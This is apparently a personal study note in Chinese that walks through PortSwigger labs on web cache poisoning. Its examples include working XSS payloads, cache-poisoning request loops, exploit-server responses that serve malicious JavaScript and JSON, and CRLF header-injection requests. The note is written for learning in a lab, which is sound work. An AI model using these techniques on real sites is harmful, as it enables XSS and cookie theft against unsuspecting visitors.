---
title: Web cache poisoning
description: Web cache poisoning
# last_update:
#   date: "2025-09-23T08:00:00+08:00"
last_update:
  date: "2025-11-09T08:00:00+08:00"
---

## Lab: Web cache poisoning with an unkeyed header

| Dimension | Description                                                                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#using-web-cache-poisoning-to-exploit-unsafe-handling-of-resource-imports |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header                           |

嘗試

```js
fetch(location.origin, {
  headers: {
    "X-Forwarded-Host": "123",
  },
});
```

看到

```html
<script type="text/javascript" src="//123/resources/js/tracking.js"></script>
```

嘗試

```js
fetch(location.origin, {
  headers: {
    "X-Forwarded-Host": `"></script><script>alert(document.cookie);const hello = "`,
  },
});
```

看到

```html
<script type="text/javascript" src="//"></script>
<script>
  alert(document.cookie);const hello = "/resources/js/tracking.js">
</script>
```

我以為這樣就結束了，不過這題有 exploit-server，所以解法可能要再想一下(?)

後來改成在 exploit-server 構造

```
/resources/js/tracking.js
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
alert(document.cookie)
```

之後觸發

```js
fetch(location.origin, {
  headers: {
    "X-Forwarded-Host": `exploit-0a3100870464b98f8009020901be00c0.exploit-server.net`,
  },
});
```

然後看 Access log，突然就通關了(?)不太懂這題為啥要 exploit-server，單純 XSS Payload 就可以達成 Web cache poisoning 了呀(?)

後來回頭看 Solution，發現我忘記了最重要的事情

```
11. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
```

所以 Web cache poisoning 也要剛好搭配 cache 過期的時候，我確實一開始沒想到這個

## Lab: Web cache poisoning with an unkeyed cookie

| Dimension | Description                                                                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie                       |

Cookie 有 `fehost: prod-cache-01`

html 有

```html
<script>
  data = {
    host: "0a37006603435c9080bf0dbc00120062.web-security-academy.net",
    path: "/",
    frontend: "prod-cache-01",
  };
</script>
```

在 Cookie.fehost 塞入

```js
encodeURIComponent(`"};alert(1);const a = { "key": "value`);
// %22%7D%3Balert(1)%3Bconst%20a%20%3D%20%7B%20%22key%22%3A%20%22value
```

## Lab: Web cache poisoning with multiple headers

| Dimension | Description                                                                                                                                            |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers                         |

這題我卡了一下，我們要汙染的是 `/resources/js/tracking.js`，讓使用者載入的 js，302 導轉到 `https://exploit-0a5e005b04761d41802efd4a01b10044.exploit-server.net/resources/js/tracking.js`

先在 exploit-server 設定

```
GET /resources/js/tracking.js HTTP/1.1
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8

alert(document.cookie)
```

之後在瀏覽器執行

```js
async function main() {
  while (true) {
    const response = await fetch(
      `${location.origin}/resources/js/tracking.js`,
      {
        headers: {
          "X-Forwarded-Host":
            "exploit-0a5e005b04761d41802efd4a01b10044.exploit-server.net",
          "X-Forwarded-Scheme": "http",
        },
        credentials: "omit",
      },
    );
    if (response.redirected) return console.log("ok");
  }
}
```

成功導轉，代表我們成功讓 `/resources/js/tracking.js` 回應的 HTTP Response 變成 302 + `Location: https://exploit-0a5e005b04761d41802efd4a01b10044.exploit-server.net/resources/js/tracking.js`，如此變會載入惡意的程式碼，並且是在 Blog Post 網站執行程式碼，而不是在惡意網站執行程式碼

## Lab: Targeted web cache poisoning using an unknown header

| Dimension | Description                                                                                                                               |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#cache-control-directives                                 |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header |

先看 `/resources/js/tracking.js` 的 Response Headers

```
Vary: User-Agent
```

留言功能允許 HTML，但有用 Dompurify，所以基本上 XSS 應該沒戲，但還是可以發起 HTTP Request

```html
<img
  src="https://exploit-0abb00f703c9311d80e54357012f009f.exploit-server.net/"
/>
```

查看 Access log

```
10.0.3.49       2025-09-20 09:46:55 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

exploit-server 設定

```
GET /resources/js/tracking.js HTTP/1.1
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8

alert(document.cookie)
```

由於瀏覽器的 JS 無法設定 `User-Agent`，所以這題要用 Burp Suite 的 Repeater，設定以下 HTTP Raw Request

```
GET /post?postId=3 HTTP/1.1
Host: 0a6300e203af31d0801e4442005400b3.h1-web-security-academy.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
X-Host: exploit-0abb00f703c9311d80e54357012f009f.exploit-server.net


```

這題的 `unknown header` 是 `X-Host`，然後重複發送請求直到看到 Response Headers 有 `X-Cache: miss`，接下來後害者瀏覽評論頁 `/post?postId=3`，就會載入

```html
<script type="text/javascript" src="//exploit-0abb00f703c9311d80e54357012f009f.exploit-server.net/resources/js/tracking.js">
```

然後就會引入我們精心設計的 JS

## Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

| Dimension | Description                                                                                                                                                                           |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#using-web-cache-poisoning-to-exploit-dom-based-vulnerabilities                                       |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria |

先觀察網站的 HTML

```html
<script>
  data = {
    host: "0a4e008d042d78fd811c435e008c00d1.web-security-academy.net",
    path: "/",
  };
</script>
<script>
  initGeoLocate("//" + data.host + "/resources/json/geolocate.json");
</script>
```

initGeoLocate

```js
function initGeoLocate(jsonUrl) {
  fetch(jsonUrl)
    .then((r) => r.json())
    .then((j) => {
      let geoLocateContent = document.getElementById("shipping-info");

      let img = document.createElement("img");
      img.setAttribute("src", "/resources/images/localShipping.svg");
      geoLocateContent.appendChild(img);

      let div = document.createElement("div");
      div.innerHTML = "Free shipping to " + j.country;
      geoLocateContent.appendChild(div);
    });
}
```

在 exploit-server 設定

```
/resources/json/geolocate.json
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *

{ "country": "<img src=x onerror=alert(document.cookie)>" }
```

嘗試在瀏覽器的 js 執行

```js
async function main() {
  while (true) {
    const response = await fetch(`${location.origin}`, {
      headers: {
        "X-Forwarded-Host":
          "exploit-0a690044046f78aa81af42b1013f00b6.exploit-server.net",
      },
      credentials: "omit",
    });
    const miss = response.headers.get("x-cache") === "miss";
    if (miss) return console.log("ok");
  }
}

async function main() {
  while (true) {
    const response = await fetch(`${location.origin}`, {
      headers: {
        "X-Host": "exploit-0a690044046f78aa81af42b1013f00b6.exploit-server.net",
      },
      credentials: "omit",
    });
    const miss = response.headers.get("x-cache") === "miss";
    if (miss) return console.log("ok");
  }
}
```

都沒辦法看到 `X-Cache: miss`

開頭其實有提到 [param-miner](https://portswigger.net/web-security/web-cache-poisoning#param-miner)，嘗試用看看

結果是

```
Initiating header bruteforce on 0a4e008d042d78fd811c435e008c00d1.web-security-academy.net
Identified parameter on 0a4e008d042d78fd811c435e008c00d1.web-security-academy.net: x-forwarded-host~%s.%h
```

代表 `X-Forwarded-Host` 真的會影響(?)後來重新看過 Response Body，真的有改變

```js
async function main() {
  while (true) {
    const response = await fetch(`${location.origin}`, {
      headers: {
        "X-Forwarded-Host":
          "exploit-0a690044046f78aa81af42b1013f00b6.exploit-server.net",
      },
      credentials: "omit",
    });
    const text = await response.text();
    const poisoned = text.includes(
      `{"host":"exploit-0a690044046f78aa81af42b1013f00b6.exploit-server.net"`,
    );
    if (poisoned) return console.log("ok");
  }
}
```

結果真的有汙染到

```html
<script>
  data = {
    host: "exploit-0a690044046f78aa81af42b1013f00b6.exploit-server.net",
    path: "/",
  };
</script>
```

只是沒有看到 `X-Cache: miss`，且有 `Cache-Control: no-cache`

有發現在 `"credentials": "omit"` 的情況，都會加上 `Set-Cookie: session=xxx` 的 Response Header，這個 Response Header 不適合被 Cache

所以後來調整成 `"credentials": "include"` 就可以正常被 Cache，然後就成功解題了～

## Lab: Combining web cache poisoning vulnerabilities

| Dimension | Description                                                                                                                        |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws#chaining-web-cache-poisoning-vulnerabilities      |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities |

觀察網站 HTML

```html
<script>
  data = {
    host: "0ab300f20416916c83ba2427001e00b0.web-security-academy.net",
    path: "/",
  };
</script>
<script>
  initTranslations("//" + data.host + "/resources/json/translations.json");
</script>
```

initTranslations.js

```js
function initTranslations(jsonUrl) {
  const lang = document.cookie
    .split(";")
    .map((c) => c.trim().split("="))
    .filter((p) => p[0] === "lang")
    .map((p) => p[1])
    .find(() => true);

  const translate = (dict, el) => {
    for (const k in dict) {
      if (el.innerHTML === k) {
        el.innerHTML = dict[k];
      } else {
        el.childNodes.forEach((el_) => translate(dict, el_));
      }
    }
  };

  fetch(jsonUrl)
    .then((r) => r.json())
    .then((j) => {
      const select = document.getElementById("lang-select");
      if (select) {
        for (const code in j) {
          const name = j[code].name;
          const el = document.createElement("option");
          el.setAttribute("value", code);
          el.innerText = name;
          select.appendChild(el);
          if (code === lang) {
            select.selectedIndex = select.childElementCount - 1;
          }
        }
      }

      lang in j &&
        lang.toLowerCase() !== "en" &&
        j[lang].translations &&
        translate(
          j[lang].translations,
          document.getElementsByClassName("maincontainer")[0],
        );
    });
}
```

translations.json

```json
{
  "en": {
    "name": "English"
  },
  "es": {
    "name": "español",
    "translations": {
      "Return to list": "Volver a la lista",
      "View details": "Ver detailes",
      "Description:": "Descripción:"
    }
  }
}
```

要讓使用者在訪問首頁時

1. Cookie.lang 不能是 en
2. 必須要讓 host 變成 exploit-server，同時在 exploit-server 構造一個惡意的 json

```html
<script>
  data = {
    host: "0ab300f20416916c83ba2427001e00b0.web-security-academy.net",
    path: "/",
  };
</script>
```

在 exploit-server 設定

```
/resources/json/translations.json
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *

{
    "es": {
        "name": "es",
        "translations": {
            "Return to list": "<img src=x onerror=alert(document.cookie)>",
            "View details": "<img src=x onerror=alert(document.cookie)>",
            "Description:": "<img src=x onerror=alert(document.cookie)>",
            "Descripción:": "<img src=x onerror=alert(document.cookie)>",
            "Volver a la lista": "<img src=x onerror=alert(document.cookie)>",
            "Ver detailes": "<img src=x onerror=alert(document.cookie)>"
        }
    }
}
```

切到 es 語言後，瀏覽器 JS 嘗試

```js
initTranslations(
  "https://exploit-0a47009a04d22fa980a761bd014c008f.exploit-server.net/resources/json/translations.json",
);
```

確定可以執行 XSS

查看切換語言，會訪問 `/setlang/es`

然後回傳

```
302
location: /?localized=1
set-cookie: lang=es; Path=/; Secure
```

這題一樣是用 `X-Forwarded-Host` 來汙染

```html
<script>
  data = {
    host: "exploit-0aaf008d040f7fb780ac701c019e00e7.exploit-server.net",
    path: "/",
  };
</script>
```

但現在就卡在，要如何改寫使用者的 Cookie，只要不是 en，我就可以達成 XSS 了

後來這題有請 AI 給提示，是要用 `X-Original-URL: /setlang\es` 的方式，完整 JS 是

```js
fetch(location.origin, {
  credentials: "include",
  redirect: "manual",
  headers: {
    "X-Original-URL": "/setlang\\es",
  },
})
  .then((res) => res.text())
  .then((text) =>
    console.log(
      text.includes(
        `"host":"exploit-0aaf008d040f7fb780ac701c019e00e7.exploit-server.net"`,
      ),
    ),
  );
fetch(`${location.origin}/?localized=1`, {
  credentials: "include",
  headers: {
    "X-Forwarded-Host":
      "exploit-0aaf008d040f7fb780ac701c019e00e7.exploit-server.net",
  },
})
  .then((res) => res.text())
  .then((text) =>
    console.log(
      text.includes(
        `"host":"exploit-0aaf008d040f7fb780ac701c019e00e7.exploit-server.net"`,
      ),
    ),
  );
```

受害者訪問首頁 > 302 導轉到 `Location: /setlang/es` > 302 導轉到 `Location: /?localized=1` 並且 Cookie.lang 被設定成 es > 訪問被汙染的 `/?localized=1` > 請求 `https://exploit-0aaf008d040f7fb780ac701c019e00e7.exploit-server.net/resources/json/translations.json` > DOM-Based XSS 執行～

這邊的重點是 `/setlang\es` 會被 Web Server 轉成 302 + `Location: /setlang/es`

其實我一開始就有發現網站的 HTML 有 backslashes 跟 forward slash 混用，只是我沒想到這是解題關鍵，果然 PortSwigger Lab 不會做沒意義的事情，每個差異都是解題的關鍵QQ

```html
<script type="text/javascript" src="\resources\js\translations.js"></script>
<script src="/resources/labheader/js/labHeader.js"></script>
```

## Akamai-based websites

這種就很吃經驗，沒用過 Akamai CDN 的話，根本不知道有這招

```
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```

## Path normalization

For example, the following entries might all be cached separately but treated as equivalent to GET / on the back-end:

Apache: `GET //`
Nginx: `GET /%2F`
PHP: `GET /index.php/xyz`
.NET: `GET /(A(xyz)/`

## Lab: Web cache poisoning via an unkeyed query string

| Dimension | Description                                                                                                                    |
| --------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#unkeyed-query-string                  |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query |

嘗試

```js
fetch(`${location.origin}`, {
  headers: {
    Pragma: "x-get-cache-key",
  },
});
```

得到

```
x-cache-key: /$$
```

嘗試

```js
fetch(`${location.origin}//`, {
  headers: {
    Pragma: "x-get-cache-key",
  },
});
```

得到

```
x-cache-key: //$$
```

觀察網站 HTML

```html
<link
  rel="canonical"
  href="//0a4c0041048c4cc080dec1b6009700aa.web-security-academy.net/?a=3"
/>
```

構造

```js
encodeURIComponent(`'/><script>alert(1)</script><link`);
// %27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink
// /?a=%27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink
```

成功解題，這題根本就是 Reflected XSS，只是剛好也可以達成 Web Cache Poisoning，我一開始被題目綁住，思維跳不開來，沒有想到 Reflected XSS

## Lab: Web cache poisoning via an unkeyed query parameter

| Dimension | Description                                                                                                                    |
| --------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#unkeyed-query-parameters              |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param |

這題跟上面一樣，改成用 `utm_content` 當作 query-string key 即可

`/?utm_content=%27%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Clink`

## Cache parameter cloaking

案例一：

利用 Cache 跟 Backend Application 對 URL Parsing 不一致的漏洞，構造

```
GET /?example=123?excluded_param=bad-stuff-here
```

Backend Application 解析成 `example => 123?excluded_param=bad-stuff-here`

Cache 解析成 `example => 123`，並且把 `excluded_param=bad-stuff-here` 移除

如此變可以汙染 `?example=123` 這把 Cache Key，同時在 Backend Application 注入 `excluded_param=bad-stuff-here`

案例二：

```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```

Cache 解析成

1. `keyed_param=abc`
2. `excluded_param=123;keyed_param=bad-stuff-here`

Backend Application (Ruby) 解析成

1. `keyed_param=abc`
2. `excluded_param=123`
3. `keyed_param=bad-stuff-here`

然後 keyed_param 重複的情況，Backend Application 拿了第二個 `keyed_param=bad-stuff-here` 去做事，回傳 poisoned response

## Lab: Parameter cloaking

| Dimension | Description                                                                                                                     |
| --------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking               |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking |

查看網站的 JS

/js/geolocate.js?callback=setCountryCookie

```js
const setCountryCookie = (country) => {
  document.cookie = "country=" + country;
};
const setLangCookie = (lang) => {
  document.cookie = "lang=" + lang;
};
setCountryCookie({ country: "United Kingdom" });
```

嘗試訪問 `/js/geolocate.js?callback=alert(1)%3Bconsole.log`

```js
const setCountryCookie = (country) => {
  document.cookie = "country=" + country;
};
const setLangCookie = (lang) => {
  document.cookie = "lang=" + lang;
};
alert(1);
console.log({ country: "United Kingdom" });
```

用 Param Minor 掃看看

```
Updating active thread pool size to 8
Loop 0
Loop 1
Queued 1 attacks from 1 requests in 0 seconds
Initiating url bruteforce on 0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net
Identified parameter on 0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net: utm_content
Found issue: Web Cache Poisoning: Query param blacklist
Target: https://0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net
The application excludes certain parameters from the cache key. This was confirmed by injecting the value 'akzldka' using the jp8gm9a44 parameter, then replaying the request without the injected value, and confirming it still appears in the response. <br>For further information on this technique, please refer to https://portswigger.net/research/web-cache-entanglement
Evidence:
======================================
GET /?utm_content=akzldka&sca73h80=1 HTTP/1.1
Host: 0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Origin: https://sca73h80.com
Via: sca73h80


======================================
GET /?utm_content=zzmkdfq&sca73h80=1 HTTP/1.1
Host: 0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Origin: https://sca73h80.com
Via: sca73h80


======================================

Found issue: Web Cache Poisoning: Parameter Cloaking
Target: https://0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net
The application can be manipulated into excluding the jp8gm9a44 parameter from the cache key, by disguising it as utm_content. <br>For further information on this technique, please refer to https://portswigger.net/research/web-cache-entanglement
Evidence:
======================================
GET /?utm_content=jp8gm9a44&utm_content=x;jp8gm9a44=akzldka&ublw998=1 HTTP/1.1
Host: 0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Origin: https://ublw998.com
Via: ublw998


======================================
GET /?utm_content=jp8gm9a44&ublw998=1 HTTP/1.1
Host: 0a0d00c003cdbe5580ce0358006100cf.web-security-academy.net
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-TW,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Origin: https://ublw998.com
Via: ublw998


======================================
```

有點長，我現在還沒完全搞懂 Param Minor 掃描的邏輯，但總之 `utm_content` 應該有料

我一開始嘗試汙染首頁，看能不能把

```html
<script
  type="text/javascript"
  src="/js/geolocate.js?callback=setCountryCookie"
></script>
```

汙染，但發現好像沒辦法，所以改成汙染 `/js/geolocate.js?callback=setCountryCookie` 這把 Cache Key

嘗試

```
/js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=alert(1)%3Bconsole.log
```

1. `callback=setCountryCookie` 是我們要汙染的 Cache Key
2. `utm_content=123;callback=alert(1)%3Bconsole.log` 會在 Cache 這層不納入 Cache Key
3. `;callback=alert(1)%3Bconsole.log` Backend Application 會成功解析這段，並且提取第二個 callback，成功 poison response

## Lab: Web cache poisoning via a fat GET request

| Dimension | Description                                                                                                              |
| --------- | ------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking        |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get |

嘗試 GET With Body

```js
fetch(location.origin, { body: "123" });
```

結果被瀏覽器的 `fetch` 擋住

```
Uncaught (in promise) TypeError: Failed to execute 'fetch' on 'Window': Request with GET/HEAD method cannot have body.
```

嘗試 POST With Body

```js
fetch(location.origin, {
  body: "123",
  method: "POST",
});
```

結果 404 Not Found

這題好像不是 poison 首頁～後來我發現這題也有載入 `/js/geolocate.js`，於是在 Burp Suite Repeater 構造

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a0d002c031f5d9e80e8263200940046.web-security-academy.net
Cookie: session=6jahqtwgCsn2eoZ5kwIf4l6AaqdZ9z1J
Content-Length: 31

callback=alert(1);console.log
```

成功看到

```
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 207

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1);console.log
({"country":"United Kingdom"});
```

這題純靠自己解，忍住沒有問 AI，成就感滿滿～

## X-HTTP-Method-Override

很酷的 Custom Header，可以覆寫原始的 HTTP Request Method，部分框架有支援（我是第一次知道）

## Normalized cache keys

假設我們透過 Burp Suite 找到一個 Reflected XSS

```
GET /search?key=<script>alert(1)</script>
```

Server 直接把 key 回顯到網頁（沒有先經過 URL Decode），這樣的 Reflected XSS 就變成只有在 Burp Suite 這種實驗環境可行，因為受害者用瀏覽器訪問時，會自動把 URL Encode

```
GET /search?key=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

但假設 Cache Key 有經過 Normalization，就有可能導致

```
GET /search?key=<script>alert(1)</script>
GET /search?key=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

是同一把 Cache Key，如此我們就可以用 Burp Suite 發送 `GET /search?key=<script>alert(1)</script>` 來污染 Cache，然後受害者訪問 `GET /search?key=%3Cscript%3Ealert(1)%3C%2Fscript%3E` 時，就會吃到 poison 過後的 Cache

## Lab: URL normalization

| Dimension | Description                                                                                                                    |
| --------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-parameter-cloaking              |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization |

這題利用的是 404 頁面的 path reflected xss，需要在 Burp Suite 構造

```
GET /<script>alert(1)</script> HTTP/2
Host: 0a67009804c8c3b780c4535900490014.web-security-academy.net
Cookie: session=1sRfKPxBJzGkrHxXNeO6RtU4Jl656T1f
```

之後把 `https://0a67009804c8c3b780c4535900490014.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E` 傳送給受害者

我原本有找到 404 頁面似乎有 reflected xss 的跡象，只是當時我是在 querystring 下手，忘記 path 也存在 reflected xss 的可能性，虧我之前還找過 [URL Path Reflected XSS](https://zeroday.hitcon.org/vulnerability/ZD-2025-01087)

## Cache key injection

假設 cache server 用 `__` 來分割 cache component

Attack Request

```
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__


```

Response

```
HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

<script>…'-alert(1)-'…</script>
```

再搭配一個社交工程，誘導受害者訪問，就會中招

```
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1
```

## Lab: Cache key injection

<!-- last_update:
  date: "2025-11-09T08:00:00+08:00" -->

| Dimension | Description                                                                                                                          |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-key-injection                         |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection |

嘗試 `Pragma: x-get-cache-key`

```
GET / HTTP/2
Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net
Cookie: session=S0CyGKRxU7iufAhqUZrutMJigwG2miwh
Pragma: x-get-cache-key


```

回傳

```
HTTP/2 302 Found
Location: /login?lang=en
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 32
X-Cache-Key: /$$
X-Cache: hit
Content-Length: 0


```

嘗試注入 origin

```
GET /path/to/source?foo=bar HTTP/2
Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net
Cookie: session=S0CyGKRxU7iufAhqUZrutMJigwG2miwh
Pragma: x-get-cache-key
Origin: hello-world


```

回傳

```
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 18
X-Cache-Key: /path/to/source?foo=bar$$origin=hello-world
X-Cache: hit
Content-Length: 11

"Not Found"
```

這題感覺很難，我後來直接看官方提供的 Solution，覺得這個 payload 根本是妖魔鬼怪，是我即便認真思考也想不出來的

Attack Request

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$


```

回傳

```
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: x
Cache-Control: max-age=35
Age: 23
X-Cache: hit
Content-Length: 8

alert(1)
```

Attack Request

```
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net


```

回傳

```
HTTP/2 302 Found
Location: /login/?lang=en
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 30
X-Cache: hit
Content-Length: 0


```

這題我覺得太難...以後有機會再來理解吧

<!-- todo-yus 未來有興趣再搞懂 -->

## Lab: Internal cache poisoning

| Dimension | Description                                                                                                               |
| --------- | ------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#poisoning-internal-caches        |
| Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal |

進來 LAB 就看到兩個奇怪的點

1. Uncaught ReferenceError: loadCountry is not defined at geolocate.js?callback=loadCountry:3:1

/js/geolocate.js?callback=loadCountry

```js
const setCountryCookie = (country) => {
  document.cookie = "country=" + country;
};
